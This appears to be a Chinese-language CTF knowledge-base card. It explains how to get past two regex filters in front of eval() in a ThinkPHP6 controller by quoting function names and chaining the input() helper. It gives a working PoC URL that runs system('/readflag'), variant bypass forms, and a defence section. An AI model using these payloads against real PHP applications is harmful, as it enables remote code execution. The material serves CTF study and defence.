---
id: web-php-rce-eval-quoted-function-input-helper-waf-bypass
title: eval 正则函数调用检测：函数名加引号绕过 + ThinkPHP input() 两级取值构造 system(/readflag)
type: scenario
domain: web
path: web/php/rce
technique: eval-quoted-function-name-input-helper-bypass
tags:
- php
- rce
- eval
- waf-bypass
- thinkphp
- function-call-regex
- variable-function
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V297
  verified_at: '2026-11-08T08:21:40+08:00'
  notes: 已对照原文与全部25张图核对：ThinkPHP6 Index控制器两道正则（图08）、'phpinfo'();绕过第一道、input()助手两级取值、最终URL编码PoC /public/?code=((%27input%27)(%27name%27)((%27input%27)(%27name1%27)));&name=system&name1=/readflag 均与原文一致。未验证点：未实际请求目标；原文未展示执行回显。
url: /docs/web/php/rce/web-php-rce-eval-quoted-function-input-helper-waf-bypass/
draft: false
kb_aliases:
- 武功山杯 萍水相逢
- ThinkPHP6 eval 绕过
- '''phpinfo''() 绕过'
- input() 助手函数
- 引号函数名
---

## 一句话结论

控制器把 `$_GET['code']` 交给 `eval()`，前置两道正则：第一道匹配“裸标识符紧跟 `(`”的函数调用，第二道按子串黑名单拦截 system/exec/`/`/空格等。把函数名加引号写成 `('input')('name')` 可让第一道正则匹配不到；再用 ThinkPHP 的 `input()` 助手从 GET 取函数名与参数，拼成 `(('input')('name')(('input')('name1')))`，代码字面量里不含危险函数名和路径，eval 实际执行 `system('/readflag')`。

## 原理

- **第一道正则的匹配条件**：`/([\w]+)([\x00-\x1F\x7F\/\*\<\>\%\w\s\\\\]+)?\(/i` 要求一个裸标识符后接可选字符集再紧跟 `(`。在 `'input'('name')` 中，`input` 后面是单引号 `'`（不在可选字符集内，也不是 `(`），因此整个调用不匹配；`function_exists($value)` 黑名单检查被完全跳过。原文验证 `'phpinfo'();` 可直接通过。
- **PHP 的可变函数调用**：PHP 7+ 允许 `('func')(args)` 这种“表达式求值为函数名再调用”的写法，字符串字面量加引号不影响执行，只改变源码的字符序列。
- **第二道正则的黑名单面**：它按子串拦截 `system`、`exec`、`passthru`、`eval`、`include`、`request`、`post`、`get`、`/`、`(` 内的空格、`$`、`_`、`%`、`|` 等。提交的 code 只含 `input`、`name`、`name1`、引号和括号，不含这些词；真正的 `system` 与 `/readflag` 通过 GET 参数 `name`、`name1` 传入，不在被检测的字符串里。
- **两级取值**：`input('name')` 读取 GET 参数 `name` 的值（本题为 `system`），`input('name1')` 读取 `/readflag`；外层把第一个结果当函数名、第二个结果当参数调用，即 `system('/readflag')`。
- **为什么成立**：正则只检查源码字面量、不分析运行期数据流；`input()` 助手把外部参数引入 eval 表达式，形成“代码本身干净、数据携带 payload”的绕过。

## 触发条件

- ThinkPHP6 应用把 `$_GET['code']` 直接 `eval()`。
- 前置 WAF 为“正则提取函数名并对照 `function_exists` 白名单 + 子串黑名单”的实现（如本例两道 `preg_match`）。
- ThinkPHP 的 `input()` 助手函数可用，且 GET 参数可自由传入。
- 攻击者可访问对应路由（本例 `/public/`）。

## 利用步骤

1. 通过 `www.zip` 等源码泄露获得控制器代码，确认 `eval($code)` 与两道正则。
2. 先用 `?code=('phpinfo')();` 验证第一道函数调用检测可被引号绕过。
3. 构造 payload：`code=(('input')('name')(('input')('name1')));`，`name=system`，`name1=/readflag`。
4. 发送请求，eval 执行 `system('/readflag')`，命令输出回显在响应中。
5. 若部分字符被拦，可改用 `input()` 取更多片段、换 helper/函数名，或对参数值做编码后再由 PHP 解码。

## PoC

URL 编码后的请求（原文）：

```
/public/?code=((%27input%27)(%27name%27)((%27input%27)(%27name1%27)));&name=system&name1=/readflag
```

解码后的 code：

```php
(('input')('name')(('input')('name1')));
```

等价于运行期执行：

```php
system('/readflag');
```

要点：函数名必须带引号（`'input'`），否则第一道正则会把 `input(` 当作函数调用并因不在白名单而被拦截；危险函数名与命令路径放在 GET 参数中。

## 变体与关联

- **可变函数/超全局变体**：若 `input()` 不可用，可用 `$_GET[1]($_GET[2])` 或 `${'_GET'}[1]` 等把函数名和参数放到运行期；但第二道正则若拦截 `$`、`_`，需要进一步变形。
- **引号绕过泛化**：任何“用正则匹配 `name(` 形式函数调用”的 WAF，都可用 `('name')(...)`、`("name")(...)`、`(name)(...)`（PHP 8 对未定义常量会报错，需带引号）等方式改变字面量形态。
- **关联卡**：`web-php-rce-eval-var-dump-superglobal-variable-function` 用 `$_GET[1]($_GET[2])` 绕过关键词过滤；本卡的核心是第一道“函数调用正则”被引号绕过 + ThinkPHP `input()` 两级取值，过滤实现不同。
- **ThinkPHP 6 其他入口**：框架的 `input()`、`request()` 等助手都可作为外部数据引入 eval 的通道；若应用对 code 做长度/字符限制，可考虑分片拼接。

## 检测与防御

- 禁止 `eval()` 执行用户输入；如必须动态执行，使用 AST 解析 + 严格白名单（只允许特定函数/字面量），不要用正则匹配函数名。
- 不要用“基于字面量”的黑名单作为安全边界；应进行数据流分析，禁止外部参数进入 eval 表达式。
- 最小化框架助手函数暴露面，关闭不必要路由；对 `code` 参数做长度和字符集白名单限制（但仍不能替代去除 eval）。
- 监控 eval 类接口的异常请求：含引号包裹的函数名、`input(`/`request(` 等助手调用、参数值出现函数名或系统路径。
